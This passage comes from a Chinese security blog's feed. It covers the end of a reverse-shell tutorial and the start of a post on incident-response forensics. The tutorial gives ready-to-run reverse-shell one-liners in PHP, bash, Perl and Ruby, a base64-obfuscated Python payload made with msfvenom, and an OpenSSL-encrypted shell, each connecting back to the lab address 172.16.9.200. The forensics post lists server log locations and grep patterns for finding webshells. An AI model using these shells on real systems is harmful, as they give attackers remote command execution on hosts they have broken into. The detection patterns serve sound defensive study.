&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 2222&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;目标机主动连接主机 (一)&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;php -r &lt;span class=&#34;string&#34;&gt;&amp;#x27;$sock=fsockopen(&amp;quot;172.16.9.200&amp;quot;,2222);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514150401946.png&#34; alt=&#34;image-20210514150401946&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514150354093.png&#34; alt=&#34;image-20210514150354093&#34;&gt;&lt;/p&gt;
&lt;p&gt;目标机主动连接主机 (二)&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;php -r &lt;span class=&#34;string&#34;&gt;&amp;#x27;exec(&amp;quot;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/172.16.9.200/2222 0&amp;gt;&amp;amp;1&amp;quot;);&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实现效果&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514151453583.png&#34; alt=&#34;image-20210514151453583&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514151533954.png&#34; alt=&#34;image-20210514151533954&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;perl脚本反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#perl脚本反弹shell&#34;&gt;#&lt;/a&gt; perl 脚本反弹 shell&lt;/h3&gt;
&lt;p&gt;攻击机开启本地监听&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 2222&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;目标主机连接攻击机&lt;/p&gt;
&lt;figure class=&#34;highlight perl&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;perl -e &lt;span class=&#34;string&#34;&gt;&amp;#x27;use Socket;$i=&amp;quot;172.16.9.200&amp;quot;;$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&amp;#123;open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/sh -i&amp;quot;);&amp;#125;;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实现效果&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514152127846.png&#34; alt=&#34;image-20210514152127846&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514152135839.png&#34; alt=&#34;image-20210514152135839&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;ruby脚本反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ruby脚本反弹shell&#34;&gt;#&lt;/a&gt; Ruby 脚本反弹 shell&lt;/h3&gt;
&lt;p&gt;攻击机开启本地监听&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 2222&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;目标主机连接攻击机&lt;/p&gt;
&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ruby -rsocket -e &lt;span class=&#34;string&#34;&gt;&amp;#x27;c=TCPSocket.new(&amp;quot;172.16.9.200&amp;quot;,&amp;quot;2222&amp;quot;);while(cmd=c.gets);IO.popen(cmd,&amp;quot;r&amp;quot;)&amp;#123;|io|c.print io.read&amp;#125;end&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;或&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ruby -rsocket -e &lt;span class=&#34;string&#34;&gt;&amp;#x27;exit if fork;c=TCPSocket.new(&amp;quot;172.16.9.200&amp;quot;,&amp;quot;2222&amp;quot;);while(cmd=c.gets);IO.popen(cmd,&amp;quot;r&amp;quot;)&amp;#123;|io|c.print io.read&amp;#125;end&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实现效果&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514153951128.png&#34; alt=&#34;image-20210514153951128&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514153957273.png&#34; alt=&#34;image-20210514153957273&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;利用metasploit生成反弹shell一句话&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用metasploit生成反弹shell一句话&#34;&gt;#&lt;/a&gt; 利用 metasploit 生成反弹 shell 一句话&lt;/h3&gt;
&lt;p&gt;攻击机开启本地监听&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 2222&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们直接可以使用&lt;strong&gt; msfvenom -l&lt;/strong&gt; 结合关键字过滤（如 = cmd/unix/reverse），列出我们需要生成的各类反弹 shell 一句话的 payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -l payloads | grep &amp;#x27;cmd/unix/reverse&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;生成一个 python 反弹 shell 的一句话&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p cmd/unix/reverse_python LHOST=172.16.9.200 LPORT=3333 -f raw &amp;gt; shell.py&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat shell.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;将 shell.py 内容复制到目标主机进行执行&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514154549401.png&#34; alt=&#34;image-20210514154549401&#34;&gt;&lt;/p&gt;
&lt;p&gt;目标主机执行&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python -c &lt;span class=&#34;string&#34;&gt;&amp;quot;exec(__import__(&amp;#x27;base64&amp;#x27;).b64decode(__import__(&amp;#x27;codecs&amp;#x27;).getencoder(&amp;#x27;utf-8&amp;#x27;)(&amp;#x27;aW1wb3J0IHNvY2tldCAgICAgICAgLCAgICAgc3VicHJvY2VzcyAgICAgICAgLCAgICAgb3MgIDsgICAgICAgICBob3N0PSIxNzIuMTYuOS4yMDAiICA7ICAgICAgICAgcG9ydD0yMjIyICA7ICAgICAgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICAgICAgICAsICAgICBzb2NrZXQuU09DS19TVFJFQU0pICA7ICAgICAgICAgcy5jb25uZWN0KChob3N0ICAgICAgICAsICAgICBwb3J0KSkgIDsgICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgICwgICAgIDApICA7ICAgICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgICAgICAsICAgICAxKSAgOyAgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgLCAgICAgMikgIDsgICAgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik=&amp;#x27;)[0]))&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;实现效果&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514154730993.png&#34; alt=&#34;image-20210514154730993&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514154739869.png&#34; alt=&#34;image-20210514154739869&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;利用openssl反弹加密shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用openssl反弹加密shell&#34;&gt;#&lt;/a&gt; 利用 OpenSSL 反弹加密 shell&lt;/h3&gt;
&lt;p&gt;如果我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。&lt;/p&gt;
&lt;p&gt;首先在攻击机 kali 生成自签名证书&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514160946360.png&#34; alt=&#34;image-20210514160946360&#34;&gt;&lt;/p&gt;
&lt;p&gt;利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;openssl s_server -quiet -key key.pem -cert cert.pem -port 2222&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;目标机进行反弹 shell 操作&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mkfifo /tmp/s; /bin/sh -i &amp;lt; /tmp/s 2&amp;gt;&amp;amp;1 | openssl s_client -quiet -connect 172.16.9.200:2222 &amp;gt; /tmp/s; rm /tmp/s&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514161122042.png&#34; alt=&#34;image-20210514161122042&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210514161128816.png&#34; alt=&#34;image-20210514161128816&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;扩展反弹shell后获取终端&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#扩展反弹shell后获取终端&#34;&gt;#&lt;/a&gt; 扩展反弹 shell 后获取终端&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/bin/bash -i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo os.system(&amp;quot;/bin/bash&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://chungod.github.io/2021/05/05/%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/</guid>
            <title>溯源取证总结</title>
            <link>https://chungod.github.io/2021/05/05/%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81%E6%80%BB%E7%BB%93/</link>
            <category>溯源取证总结</category>
            <pubDate>Wed, 05 May 2021 15:17:48 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;溯源取证总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#溯源取证总结&#34;&gt;#&lt;/a&gt; 溯源取证总结&lt;/h2&gt;
&lt;h4 id=&#34;类型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#类型&#34;&gt;#&lt;/a&gt; 类型&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;web 入侵：挂马、网页篡改（博彩 / 黑帽 SEO 等）、植入 webshell，黑页，暗链等&lt;/li&gt;
&lt;li&gt;主机入侵：病毒木马、勒索软件、远控后门、系统异常、RDP 爆破、SSH 爆破、主机漏洞、数据库入侵等&lt;/li&gt;
&lt;li&gt;网络攻击：DDOS 攻击、DNS/HTTP 劫持、ARP 欺骗等&lt;/li&gt;
&lt;li&gt;路由器 / 交换机异常：内网病毒，配置错误等&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;初步信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#初步信息收集&#34;&gt;#&lt;/a&gt; 初步信息收集&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;客户属性：如名称 / 区域 / 领域等&lt;/li&gt;
&lt;li&gt;入侵范围：如主机数 / 网段等&lt;/li&gt;
&lt;li&gt;入侵现象：如 cpu 过高，勒索界面，异常网络链接，安全设备告警等&lt;/li&gt;
&lt;li&gt;客户需求：是否要求溯源，是否要求协助修复等&lt;/li&gt;
&lt;li&gt;收集信息：操作系统版本，补丁，数据库版本，中间件 / 服务器，网络拓扑，受害范围，处置情况，提取日志（主机，安全设备，数据库等）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;应急响应资源:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3RoZUxTQS9oYWNrLWVyLXRvb2xz&#34;&gt;https://github.com/theLSA/hack-er-tools&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;分析流程image-20210505094445689&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#分析流程image-20210505094445689&#34;&gt;#&lt;/a&gt; 分析流程&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210505094445689.png&#34; alt=&#34;image-20210505094445689&#34;&gt;&lt;/h4&gt;
&lt;h2 id=&#34;web应急响应&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web应急响应&#34;&gt;#&lt;/a&gt; Web 应急响应&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;各类中间件/服务器日志默认存放位置&lt;/code&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;服务名&lt;/th&gt;
&lt;th&gt;服务器日志默认存放位置&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;IIS&lt;/td&gt;
&lt;td&gt;C:\WINDOWS\system32\LogFiles&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;apache&lt;/td&gt;
&lt;td&gt;Linux：/usr/local/apache/logs/&lt;br/&gt;Windows：apache/logs/&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;tomcat&lt;/td&gt;
&lt;td&gt;conf/logging.properties&lt;br/&gt;logs/catalina.xx.log&lt;br/&gt;logs/host-manager.xx.log&lt;br/&gt;logs/localhost.xx.log&lt;br/&gt;logs/manager.xx.log&lt;br/&gt;主要记录系统启、关闭日志、管理日志和异常信息&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;weblogic&lt;/td&gt;
&lt;td&gt;domain_name/servers/server_name/logs/&lt;br/&gt;server_name.log：server 启停日志&lt;br/&gt;access.log：安装在该 server 之上的应用 http 访问日志&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;jboss&lt;/td&gt;
&lt;td&gt;LOG4J 配置默认 Deploy/conf/&lt;br/&gt;如 jboss/server/default/conf/jboss-log4j.xml&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;webshell排查&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#webshell排查&#34;&gt;#&lt;/a&gt; webshell 排查&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1. 整站打包用webshell扫描工具扫&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2. 利用Linux find命令查询木马&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight clojure&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;find /var/www/ -name &lt;span class=&#34;string&#34;&gt;&amp;quot;*.php&amp;quot;&lt;/span&gt; |xargs egrep &amp;#x27;assert|phpspy|c&lt;span class=&#34;number&#34;&gt;99&lt;/span&gt;sh|milw&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;rm|eval|(&lt;span class=&#34;name&#34;&gt;gunerpress&lt;/span&gt;|&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(&lt;span class=&#34;name&#34;&gt;base64_decoolcode&lt;/span&gt;|spider_bc|shell_exec|passthru|($_\POST[|eval&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(&lt;span class=&#34;name&#34;&gt;str_rot13&lt;/span&gt;|.chr(|$&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;_P|eval($_R|file_put_contents(.*$_|base64_decode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight clojure&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;grep -i –r eval($_post /app/website/*&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight clojure&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;find /app/website/ -type f|xargs grep eval($_post&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;数据库排查&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#数据库排查&#34;&gt;#&lt;/a&gt; 数据库排查&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;mysql和mssql日志&lt;/code&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;日志类型 (mysql)&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;错误日志&lt;/td&gt;
&lt;td&gt;默认开启，hostname.error&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;查询日志&lt;/td&gt;
&lt;td&gt;记录用户的所有操作。默认关闭，general_log_file（常见 getshell 手法）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;慢查询日志&lt;/td&gt;
&lt;td&gt;记录执行时间超过指定时间的查询语句，slow_query_log_file（慢查询 getshell）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;事务日志&lt;/td&gt;
&lt;td&gt;ib_logfile0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;二进制日志&lt;/td&gt;
&lt;td&gt;记录修改数据或有可能引起数据改变的 mysql 语句，log_bin，默认在数据目录，如&lt;br/&gt;mysql-bin.000001&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;日志类型 (mssql) 版本 ****&lt;/td&gt;
&lt;td&gt;&lt;strong&gt;默认路径&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SQL SERVER 2005&lt;/td&gt;
&lt;td&gt;Program Files\Microsoft SQL Server\MSSQL.&lt;em&gt;n&lt;/em&gt;\MSSQL\LOG&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SQL SERVER 2008&lt;/td&gt;
&lt;td&gt;Program Files\Microsoft SQL Server\MSSQL10. 实例名 \MSSQL\LOG&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;SQL SERVER 2008 R2&lt;/td&gt;
&lt;td&gt;Program Files\Microsoft SQL Server\MSSQL10_50. 实例名 \MSSQL\LOG&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span 